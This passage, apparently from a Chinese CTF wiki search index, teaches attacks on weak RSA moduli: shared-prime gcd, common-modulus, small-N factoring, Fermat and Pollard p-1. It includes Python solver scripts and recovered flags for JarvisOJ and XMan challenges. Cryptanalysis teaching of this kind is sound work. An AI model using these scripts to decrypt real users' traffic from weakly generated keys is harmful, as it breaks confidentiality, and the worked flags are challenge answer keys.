\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u76f4\u63a5\u6253\u5f00 pcap \u5305\uff0c\u53d1\u73b0\u6709\u4e00\u5806\u7684\u6d88\u606f\uff0c\u5305\u542b N \u548c e\uff0c\u7136\u540e\u8bd5\u4e86\u8bd5\u4e0d\u540c\u7684 N \u662f\u5426\u4e92\u7d20\uff0c\u6211\u8bd5\u4e86\u524d\u4e24\u4e2a import gmpy2 n1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031 n2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943 print gmpy2 . gcd ( n1 , n2 ) \u7ed3\u679c\u53d1\u73b0\u7adf\u7136\u4e0d\u4e92\u7d20\u3002 \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py 122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137 \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6765\u89e3\u5bc6\u4e86\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7b2c\u4e00\u5bf9\u516c\u94a5\u5bc6\u7801\u3002\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode n1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031 n2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943 p1 = gmpy2 . gcd ( n1 , n2 ) q1 = n1 / p1 e = 65537 phin = ( p1 - 1 ) * ( q1 - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7 plain = gmpy2 . powmod ( cipher , d , n1 ) plain = hex ( plain )[ 2 :] if len ( plain ) % 2 != 0 : plain = '0' + plain print plain . decode ( 'hex' ) \u6700\u540e\u89e3\u5bc6\u5982\u4e0b \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py sH1R3_PRlME_1N_rsA_iS_4ulnEra5le \u89e3\u538b\u538b\u7f29\u5305\u5373\u53ef\u3002 \u5171\u6a21\u653b\u51fb \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5f53\u4e24\u4e2a\u7528\u6237\u4f7f\u7528\u76f8\u540c\u7684\u6a21\u6570 N\u3001\u4e0d\u540c\u7684\u79c1\u94a5\u65f6\uff0c\u52a0\u5bc6\u540c\u4e00\u660e\u6587\u6d88\u606f\u65f6\u5373\u5b58\u5728\u5171\u6a21\u653b\u51fb\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u8bbe\u4e24\u4e2a\u7528\u6237\u7684\u516c\u94a5\u5206\u522b\u4e3a e_1 e_1 \u548c e_2 e_2 \uff0c\u4e14\u4e24\u8005\u4e92\u8d28\u3002\u660e\u6587\u6d88\u606f\u4e3a m m \uff0c\u5bc6\u6587\u5206\u522b\u4e3a\uff1a c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N \u5f53\u653b\u51fb\u8005\u622a\u83b7 c_1 c_1 \u548c c_2 c_2 \u540e\uff0c\u5c31\u53ef\u4ee5\u6062\u590d\u51fa\u660e\u6587\u3002\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u51fa re_1+se_2=1\\bmod n re_1+se_2=1\\bmod n \u7684\u4e24\u4e2a\u6574\u6570 r r \u548c s s \uff0c\u7531\u6b64\u53ef\u5f97\uff1a \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60 \u00b6 \u9898\u76ee\u63cf\u8ff0\uff1a {6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773} {6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839} message1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349 message2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535 \u9898\u76ee\u6765\u6e90\uff1aXMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60 \u53ef\u4ee5\u770b\u51fa\u4e24\u4e2a\u516c\u94a5\u7684 N \u662f\u4e00\u6837\u7684\uff0c\u5e76\u4e14\u4e24\u8005\u7684 e \u4e92\u7d20\u3002\u5199\u4e00\u4e2a\u811a\u672c\u8dd1\u4e00\u4e0b\uff1a import gmpy2 n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249 e1 = 773 e2 = 839 message1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349 message2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535 # s & t gcd , s , t = gmpy2 . gcdext ( e1 , e2 ) if s < 0 : s = - s message1 = gmpy2 . invert ( message1 , n ) if t < 0 : t = - t message2 = gmpy2 . invert ( message2 , n ) plain = gmpy2 . powmod ( message1 , s , n ) * gmpy2 . powmod ( message2 , t , n ) % n print plain \u5f97\u5230 \u279c Xman-1-class-exercise git: ( master ) \u2717 python exp.py 1021089710312311910410111011910111610410511010710511610511511211111511510598108101125 \u8fd9\u65f6\u5019\u9700\u8981\u8003\u8651\u5f53\u65f6\u660e\u6587\u662f\u5982\u4f55\u8f6c\u5316\u4e3a\u8fd9\u4e2a\u6570\u5b57\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u662f 16 \u8fdb\u5236\u8f6c\u6362\uff0cASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u6216\u8005 Base64 \u89e3\u5bc6\u3002\u8fd9\u4e2a\u5e94\u8be5\u662f ASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u8fdb\u800c\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u4ee3\u7801\u5f97\u5230 flag i = 0 flag = \"\" plain = str ( plain ) while i < len ( plain ): if plain [ i ] == '1' : flag += chr ( int ( plain [ i : i + 3 ])) i += 3 else : flag += chr ( int ( plain [ i : i + 2 ])) i += 2 print flag \u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f7f\u7528 1 \u6765\u5224\u65ad\u662f\u5426\u4e3a\u4e09\u4f4d\u957f\u5ea6\uff0c\u662f\u56e0\u4e3a flag \u4e00\u822c\u90fd\u662f\u660e\u6587\u5b57\u7b26\uff0c\u800c 1 \u5f00\u5934\u7684\u957f\u5ea6\u4e3a 1 \u6216\u8005 2 \u7684\u6570\u5b57\uff0c\u4e00\u822c\u90fd\u662f\u4e0d\u53ef\u89c1\u5b57\u7b26\u3002 flag \u279c Xman-1-class-exercise git: ( master ) \u2717 python exp.py flag { whenwethinkitispossible } \u9898\u76ee \u00b6 Jarvis OJ very hard RSA","title":"\u6a21\u6570\u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_1","text":"","title":"\u6a21\u6570\u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#n","text":"","title":"\u66b4\u529b\u5206\u89e3 N"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_2","text":"\u5728 N \u7684\u6bd4\u7279\u4f4d\u6570\u5c0f\u4e8e 512 \u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u91c7\u7528\u5927\u6574\u6570\u5206\u89e3\u7684\u7b56\u7565\u83b7\u53d6 p \u548c q\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#jarvisoj-easy-rsa","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 \"JarvisOJ - Easy RSA\" \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u5982\u4e0b \u8fd8\u8bb0\u5f97 veryeasy RSA \u5417\uff1f\u662f\u4e0d\u662f\u4e0d\u96be\uff1f\u90a3\u7ee7\u7eed\u6765\u770b\u770b\u8fd9\u9898\u5427\uff0c\u8fd9\u9898\u4e5f\u4e0d\u96be\u3002 \u5df2\u77e5\u4e00\u6bb5 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u4e3a\uff1a0xdc2eeeb2782c \u4e14\u5df2\u77e5\u52a0\u5bc6\u6240\u7528\u7684\u516c\u94a5\uff1a N=322831561921859 e = 23 \u8bf7\u89e3\u5bc6\u51fa\u660e\u6587\uff0c\u63d0\u4ea4\u65f6\u8bf7\u5c06\u6570\u5b57\u8f6c\u5316\u4e3a ascii \u7801\u63d0\u4ea4 \u6bd4\u5982\u4f60\u89e3\u51fa\u7684\u660e\u6587\u662f 0x6162\uff0c\u90a3\u4e48\u8bf7\u63d0\u4ea4\u5b57\u7b26\u4e32 ab \u63d0\u4ea4\u683c\u5f0f\uff1a PCTF{\u660e\u6587\u5b57\u7b26\u4e32} \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684 N \u6bd4\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 factordb \u8fdb\u884c\u5206\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230 322831561921859 = 13574881 \\times 23781539 322831561921859 = 13574881 \\times 23781539 \u8fdb\u800c\u6211\u4eec\u7b80\u5355\u7f16\u5199\u7a0b\u5e8f\u5982\u4e0b import gmpy2 p = 13574881 q = 23781539 n = p * q e = 23 c = 0xdc2eeeb2782c phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) p = gmpy2 . powmod ( c , d , n ) tmp = hex ( p ) print tmp , tmp [ 2 :] . decode ( 'hex' ) \u7ed3\u679c\u5982\u4e0b \u279c Jarvis OJ-Basic-easyRSA git: ( master ) \u2717 python exp.py 0x33613559 3a5Y","title":"JarvisOJ - Easy RSA"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-q-n","text":"","title":"p &amp; q \u4e0d\u5f53\u5206\u89e3 N"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_3","text":"\u5f53 RSA \u4e2d p \u548c q \u9009\u53d6\u4e0d\u5f53\u65f6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-q","text":"\u5f53 p-q \u5f88\u5927\u65f6\uff0c\u4e00\u5b9a\u5b58\u5728\u67d0\u4e00\u4e2a\u53c2\u6570\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u4e3a p\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7a77\u4e3e\u7684\u65b9\u6cd5\u5bf9\u6a21\u6570\u8fdb\u884c\u8bd5\u9664\uff0c\u4ece\u800c\u5206\u89e3\u6a21\u6570\uff0c\u5f97\u5230\u4fdd\u5bc6\u53c2\u6570\u4e0e\u660e\u6587\u4fe1\u606f\u3002\u57fa\u672c\u6765\u8bf4\uff0c\u4e0d\u600e\u4e48\u53ef\u884c\u3002","title":"|p-q| \u5f88\u5927"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-q_1","text":"\u9996\u5148 \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} \u65e2\u7136 |p-q| \u8f83\u5c0f\uff0c\u90a3\u4e48 \\frac{(p-q)^2}{4} \\frac{(p-q)^2}{4} \u81ea\u7136\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u8fdb\u800c \\frac{(p+q)^2}{4} \\frac{(p+q)^2}{4} \u53ea\u662f\u6bd4 N \u7a0d\u5fae\u5927\u4e00\u70b9\uff0c\u6240\u4ee5 \\frac{p+q}{2} \\frac{p+q}{2} \u4e0e \\sqrt{n} \\sqrt{n} \u76f8\u8fd1\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u6cd5\u6765\u5206\u89e3 \u987a\u5e8f\u68c0\u67e5 \\sqrt{n} \\sqrt{n} \u7684\u6bcf\u4e00\u4e2a\u6574\u6570 x\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a x \u4f7f\u5f97 x^2-n x^2-n \u662f\u5e73\u65b9\u6570\uff0c\u8bb0\u4e3a y^2 y^2 \u90a3\u4e48 x^2-n=y^2 x^2-n=y^2 \uff0c\u8fdb\u800c\u6839\u636e\u5e73\u65b9\u5dee\u516c\u5f0f\u5373\u53ef\u5206\u89e3 N","title":"|p-q| \u8f83\u5c0f"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-1","text":"\u5149\u6ed1\u6570(Smooth number)\uff1a\u6307\u53ef\u4ee5\u5206\u89e3\u4e3a\u5c0f\u7d20\u6570\u4e58\u79ef\u7684\u6b63\u6574\u6570 \u5f53 p p \u662f N N \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p-1 p-1 \u662f\u5149\u6ed1\u6570\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Pollard's p-1 \u7b97\u6cd5\u6765\u5206\u89e3 N N \u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\u6709 \u82e5p\\nmid a,\\ \u5219a^{p-1}\\equiv 1\\pmod{p} \u82e5p\\nmid a,\\ \u5219a^{p-1}\\equiv 1\\pmod{p} \u5219\u6709 a^{t(p-1)}\\equiv 1^t \\equiv 1\\pmod{p} a^{t(p-1)}\\equiv 1^t \\equiv 1\\pmod{p} \u5373 a^{t(p-1)} - 1 = k*p a^{t(p-1)} - 1 = k*p \u6839\u636e Pollard's p-1 \u7b97\u6cd5\uff1a \u5982\u679c p p \u662f\u4e00\u4e2a B-smooth\\ number B-smooth\\ number \uff0c\u90a3\u4e48\u5219\u5b58\u5728 M = \\prod_{q\\le{B}}{q^{\\lfloor\\log_q{B}\\rfloor}} M = \\prod_{q\\le{B}}{q^{\\lfloor\\log_q{B}\\rfloor}} \u4f7f\u5f97 (p-1)\\mid M (p-1)\\mid M \u6210\u7acb\uff0c\u5219\u6709 \\gcd{(a^{M}-1, N)} \\gcd{(a^{M}-1, N)} \u5982\u679c\u7ed3\u679c\u4e0d\u4e3a 1 1 \u6216 N N \uff0c\u90a3\u4e48\u5c31\u5df2\u6210\u529f\u5206\u89e3 N N \u3002 \u56e0\u4e3a\u6211\u4eec\u53ea\u5173\u5fc3\u6700\u540e\u7684gcd\u7ed3\u679c\uff0c\u540c\u65f6 N \u53ea\u5305\u542b\u4e24\u4e2a\u7d20\u56e0\u5b50\uff0c\u5219\u6211\u4eec\u4e0d\u9700\u8981\u8ba1\u7b97 M M \uff0c\u8003\u8651 n=2,3,\\dots n=2,3,\\dots \uff0c\u4ee4 M = n! M = n! \u5373\u53ef\u8986\u76d6\u6b63\u786e\u7684 M M \u540c\u65f6\u65b9\u4fbf\u8ba1\u7b97\u3002 \u5728\u5177\u4f53\u8ba1\u7b97\u4e2d\uff0c\u53ef\u4ee5\u4ee3\u5165\u964d\u5e42\u8fdb\u884c\u8ba1\u7b97 a^{n!}\\bmod{N}=\\begin{cases} (a\\bmod{N})^2\\mod{N}&n=2\\\\ (a^{(n-1)!}\\bmod{N})^n\\mod{N}&n\\ge{3} \\end{cases} a^{n!}\\bmod{N}=\\begin{cases} (a\\bmod{N})^2\\mod{N}&n=2\\\\ (a^{(n-1)!}\\bmod{N})^n\\mod{N}&n\\ge{3} \\end{cases} Python\u4ee3\u7801\u5b9e\u73b0 from gmpy2 import * a = 2 n = 2 while True : a = powmod ( a , n , N ) res = gcd ( a - 1 , N ) if res != 1 and res != N : q = n // res d = invert ( e , ( res - 1 ) * ( q - 1 )) m = powmod ( c , d , N ) print ( m ) break n += 1","title":"p - 1 \u5149\u6ed1"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-1_1","text":"\u5f53 p p \u662f N N \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p+1 p+1 \u662f\u5149\u6ed1\u6570\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Williams's p+1 \u7b97\u6cd5\u6765\u5206\u89e3 N N \u5df2\u77e5 N N \u7684\u56e0\u6570 p p \uff0c\u4e14 p+1 p+1 \u662f\u4e00\u4e2a\u5149\u6ed1\u6570 p = \\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)+1 p = \\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)+1 q_i q_i \u5373\u7b2c i i \u4e2a\u7d20\u56e0\u6570\u4e14\u6709 q_i^{\\alpha_i}\\le B_1 q_i^{\\alpha_i}\\le B_1 , \u627e\u5230 \\beta_i \\beta_i \u4f7f\u5f97\u8ba9 q_i^{\\beta_i}\\le B_1 q_i^{\\beta_i}\\le B_1 \u4e14 q_i^{\\beta_i+1}> B_1 q_i^{\\beta_i+1}> B_1 \uff0c\u7136\u540e\u4ee4 R = \\prod_{i=1}^k{q_i^{\\beta_i}} R = \\prod_{i=1}^k{q_i^{\\beta_i}} \u663e\u7136\u6709 p-1\\mid R p-1\\mid R \u4e14\u5f53 (N, a) = 1 (N, a) = 1 \u65f6\u6709 a^{p-1}\\equiv 1 \\pmod{p} a^{p-1}\\equiv 1 \\pmod{p} \uff0c\u6240\u4ee5\u6709 a^R\\equiv 1\\pmod{p} a^R\\equiv 1\\pmod{p} \uff0c\u5373 p\\mid(N, a^R-1) p\\mid(N, a^R-1) \u4ee4 P,Q P,Q \u4e3a\u6574\u6570\uff0c \\alpha,\\beta \\alpha,\\beta \u4e3a\u65b9\u7a0b x^2-Px+Q=0 x^2-Px+Q=0 \u7684\u6839\uff0c\u5b9a\u4e49\u5982\u4e0b\u7c7b\u5362\u5361\u65af\u5e8f\u5217 \\begin{aligned} U_n(P, Q) &= (\\alpha^n -\\beta^n)/(\\alpha - \\beta)\\\\ V_n(P, Q) &= \\alpha^n + \\beta^n \\end{aligned} \\begin{aligned} U_n(P, Q) &= (\\alpha^n -\\beta^n)/(\\alpha - \\beta)\\\\ V_n(P, Q) &= \\alpha^n + \\beta^n \\end{aligned} \u540c\u6837\u6709 \\Delta = (\\alpha - \\beta)^2 = P^2-4Q \\Delta = (\\alpha - \\beta)^2 = P^2-4Q \uff0c\u5219\u6709 \\begin{cases} U_{n+1} &= PU_n - QU_{n-1}\\\\ V_{n+1} &= PV_n - QV_{n-1} \\end{cases}\\tag{2.2} \\begin{cases} U_{n+1} &= PU_n - QU_{n-1}\\\\ V_{n+1} &= PV_n - QV_{n-1} \\end{cases}\\tag{2.2} \\begin{cases} U_{2n} &= V_nU_n\\\\ V_{2n} &= V_n^2 - 2Q^n \\end{cases}\\tag{2.3} \\begin{cases} U_{2n} &= V_nU_n\\\\ V_{2n} &= V_n^2 - 2Q^n \\end{cases}\\tag{2.3} \\begin{cases} U_{2n-1} &= U_n^2 - QU_{n-1}^2\\\\ V_{2n-1} &= V_nV_{n-1} - PQ^{n-1} \\end{cases}\\tag{2.4} \\begin{cases} U_{2n-1} &= U_n^2 - QU_{n-1}^2\\\\ V_{2n-1} &= V_nV_{n-1} - PQ^{n-1} \\end{cases}\\tag{2.4} \\begin{cases} \\Delta U_{n} &= PV_n - 2QV_{n-1}\\\\ V_{n} &= PU_n - 2QU_{n-1} \\end{cases}\\tag{2.5} \\begin{cases} \\Delta U_{n} &= PV_n - 2QV_{n-1}\\\\ V_{n} &= PU_n - 2QU_{n-1} \\end{cases}\\tag{2.5} \\begin{cases} U_{m+n} &= U_mU_{n+1} - QU_{m-1}U_n\\\\ \\Delta U_{m+n} &= V_mV_{n+1} - QV_{m-1}V_n \\end{cases}\\tag{2.6} \\begin{cases} U_{m+n} &= U_mU_{n+1} - QU_{m-1}U_n\\\\ \\Delta U_{m+n} &= V_mV_{n+1} - QV_{m-1}V_n \\end{cases}\\tag{2.6} \\begin{cases} U_{n}(V_k(P, Q), Q^k) &= U_{nk}(P, Q)/U_k(P, Q)\\\\ V_{n}(V_k(P, Q), Q^k) &= V_n(P, Q) \\end{cases}\\tag{2.7} \\begin{cases} U_{n}(V_k(P, Q), Q^k) &= U_{nk}(P, Q)/U_k(P, Q)\\\\ V_{n}(V_k(P, Q), Q^k) &= V_n(P, Q) \\end{cases}\\tag{2.7} \u540c\u65f6\u6211\u4eec\u6709\u5982\u679c (N, Q) = 1 (N, Q) = 1 \u4e14 P^{'}Q\\equiv P^2-2Q\\pmod{N} P^{'}Q\\equiv P^2-2Q\\pmod{N} \uff0c\u5219\u6709 P^{'}\\equiv \\alpha/\\beta + \\beta/\\alpha P^{'}\\equiv \\alpha/\\beta + \\beta/\\alpha \u4ee5\u53ca Q^{'}\\equiv \\alpha/\\beta + \\beta/\\alpha = 1 Q^{'}\\equiv \\alpha/\\beta + \\beta/\\alpha = 1 \uff0c\u5373 U_{2m}(P, Q)\\equiv PQ^{m-1}U_m(P^{'}, 1)\\pmod{N}\\tag{2.8} U_{2m}(P, Q)\\equiv PQ^{m-1}U_m(P^{'}, 1)\\pmod{N}\\tag{2.8} \u6839\u636e\u6269\u5c55\u5362\u5361\u65af\u5b9a\u7406 \u5982\u679cp\u662f\u5947\u7d20\u6570\uff0c p\\nmid Q p\\nmid Q \u4e14\u52d2\u8ba9\u5fb7\u7b26\u53f7 (\\Delta/p) = \\epsilon (\\Delta/p) = \\epsilon \uff0c\u5219 \\begin{aligned} U_{(p-\\epsilon)m}(P, Q) &\\equiv 0\\pmod{p}\\\\ V_{(p-\\epsilon)m}(P, Q) &\\equiv 2Q^{m(1-\\epsilon)/2}\\pmod{p} \\end{aligned} \\begin{aligned} U_{(p-\\epsilon)m}(P, Q) &\\equiv 0\\pmod{p}\\\\ V_{(p-\\epsilon)m}(P, Q) &\\equiv 2Q^{m(1-\\epsilon)/2}\\pmod{p} \\end{aligned} \u7b2c\u4e00\u79cd\u60c5\u51b5 \uff1a\u5df2\u77e5N\u7684\u56e0\u6570p\uff0c\u4e14p+1\u662f\u4e00\u4e2a\u5149\u6ed1\u6570 p = \\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)-1 p = \\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)-1 \u6709 p+1\\mid R p+1\\mid R \uff0c\u5f53 (Q, N)=1 (Q, N)=1 \u4e14 (\\Delta/p) = -1 (\\Delta/p) = -1 \u65f6\u6709 p\\mid U_R(P, Q) p\\mid U_R(P, Q) \uff0c\u5373 p\\mid (U_R(P, Q), N) p\\mid (U_R(P, Q), N) \u4e3a\u4e86\u627e\u5230 U_R(P, Q) U_R(P, Q) \uff0c Guy \u548c Conway \u63d0\u51fa\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u516c\u5f0f \\begin{aligned} U_{2n-1} &= U_n^2 - QU_n^2 - 1\\\\ U_{2n} &= U_n(PU_n - 2QU_{n-1})\\\\ U_{2n+1} &= PU_{2n} - QU_{2n-1} \\end{aligned} \\begin{aligned} U_{2n-1} &= U_n^2 - QU_n^2 - 1\\\\ U_{2n} &= U_n(PU_n - 2QU_{n-1})\\\\ U_{2n+1} &= PU_{2n} - QU_{2n-1} \\end{aligned} \u4f46\u662f\u4e0a\u8ff0\u516c\u5f0f\u503c\u592a\u5927\u4e86\uff0c\u4e0d\u4fbf\u8fd0\u7b97\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5982\u4e0b\u65b9\u6cd5 \u5982\u679c p \\mid U_R(P, 1) p \\mid U_R(P, 1) \uff0c\u6839\u636e \u516c\u5f0f2.3 \u6709 p\\mid U_{2R}(P, Q) p\\mid U_{2R}(P, Q) \uff0c\u6240\u4ee5\u6839\u636e \u516c\u5f0f2.8 \u6709 p \\mid U_R(P^{'}, 1) p \\mid U_R(P^{'}, 1) \uff0c\u8bbe Q=1 Q=1 \uff0c\u5219\u6709 V_{(p-\\epsilon)m}(P, 1) \\equiv 2\\pmod{p} V_{(p-\\epsilon)m}(P, 1) \\equiv 2\\pmod{p} \u5373\uff0c\u5982\u679c p\\mid U_R(P, 1) p\\mid U_R(P, 1) \uff0c\u5219 p\\mid(V_R(P, 1) -2) p\\mid(V_R(P, 1) -2) . \u7b2c\u4e00\u79cd\u60c5\u51b5\u53ef\u4ee5\u5f52\u7eb3\u4e3a\uff1a \u8ba9 R = r_1r_2r_3\\cdots r_m R = r_1r_2r_3\\cdots r_m \uff0c\u540c\u65f6\u627e\u5230 P_0 P_0 \u4f7f\u5f97 (P_0^2-4, N) = 1 (P_0^2-4, N) = 1 \uff0c\u5b9a\u4e49 V_n(P) = V_n(P, 1), U_n(P) = U_n(P, 1) V_n(P) = V_n(P, 1), U_n(P) = U_n(P, 1) \u4e14 P_j \\equiv V_{r_j}(P_{j-1})\\pmod{N}(j = 1,2,3,\\dots,m) P_j \\equiv V_{r_j}(P_{j-1})\\pmod{N}(j = 1,2,3,\\dots,m) \u6839\u636e \u516c\u5f0f2.7 \uff0c\u6709 P_m \\equiv V_R(P_0)\\pmod{N}\\tag{3.1} P_m \\equiv V_R(P_0)\\pmod{N}\\tag{3.1} \u8981\u8ba1\u7b97 V_r = V_r(P) V_r = V_r(P) \u53ef\u4ee5\u7528\u5982\u4e0b\u516c\u5f0f \u6839\u636e \u516c\u5f0f2.2 \uff0c \u516c\u5f0f2.3 \uff0c \u516c\u5f0f2.4 \u6709 \\begin{cases} V_{2f-1}&\\equiv V_fV_{f-1}-P\\\\ V_{2f}&\\equiv V_f^2 - 2\\\\ V_{2f+1}&\\equiv PV_f^2-V_fV_{f-1}-P\\pmod(N) \\end{cases} \\begin{cases} V_{2f-1}&\\equiv V_fV_{f-1}-P\\\\ V_{2f}&\\equiv V_f^2 - 2\\\\ V_{2f+1}&\\equiv PV_f^2-V_fV_{f-1}-P\\pmod(N) \\end{cases} \u4ee4 r = \\sum_{i=0}^t{b_t2^{t-i}}\\ \\ \\ \\ (b_i=0,1) r = \\sum_{i=0}^t{b_t2^{t-i}}\\ \\ \\ \\ (b_i=0,1) f_0=1, f_{k+1}=2f_k+b_{k+1} f_0=1, f_{k+1}=2f_k+b_{k+1} \uff0c\u5219 f_t=r f_t=r \uff0c\u540c\u6837 V_0(P) = 2, V_1(P) = P V_0(P) = 2, V_1(P) = P \uff0c\u5219\u6700\u7ec8\u516c\u5f0f\u4e3a (V_{f_{k+1}}, V_{f_{k+1}-1}) = \\begin{cases} (V_{2f_k}, V_{2f_k-1})\\ \\ \\ \\ if\\ b_{k+1}=0\\\\ (V_{2f_k+1}, V_{2f_k})\\ \\ \\ \\ if\\ b_{k+1}=1 \\end{cases} (V_{f_{k+1}}, V_{f_{k+1}-1}) = \\begin{cases} (V_{2f_k}, V_{2f_k-1})\\ \\ \\ \\ if\\ b_{k+1}=0\\\\ (V_{2f_k+1}, V_{2f_k})\\ \\ \\ \\ if\\ b_{k+1}=1 \\end{cases} \u7b2c\u4e8c\u79cd\u60c5\u51b5 \uff1a\u5df2\u77e5p+1\u662f\u4e00\u4e2a\u5149\u6ed1\u6570 p 